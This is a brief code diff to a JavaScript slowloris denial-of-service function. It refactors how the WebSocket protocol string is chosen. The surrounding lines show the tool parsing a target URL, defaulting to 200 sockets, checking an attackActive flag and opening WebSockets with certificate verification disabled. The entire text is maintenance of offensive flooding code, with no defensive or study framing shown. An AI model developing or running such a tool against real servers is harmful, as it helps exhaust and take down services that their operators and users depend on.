@@ -18,6 +18,7 @@ function slowloris(target, numSockets, statsCallback) {
     let port;
     let isSecure;
     let path;
+    let protocol;
 
     try {
         const parsedTarget = new URL(target);
@@ -25,6 +26,8 @@ function slowloris(target, numSockets, statsCallback) {
         port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
         isSecure = parsedTarget.protocol === 'https:';
         path = parsedTarget.pathname || "/";
+        protocol = parsedTarget.protocol === 'https:' ? 'wss://' : 'ws://';
+
 
         if (!numSockets || numSockets <= 0) {
             numSockets = 200;
@@ -62,7 +65,6 @@ function slowloris(target, numSockets, statsCallback) {
         if (!attackActive) return;
         let socket;
         try {
-            const protocol = isSecure ? 'wss://' : 'ws://';
             socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
                 origin: `${protocol}${hostname}`,
                 rejectUnauthorized: false
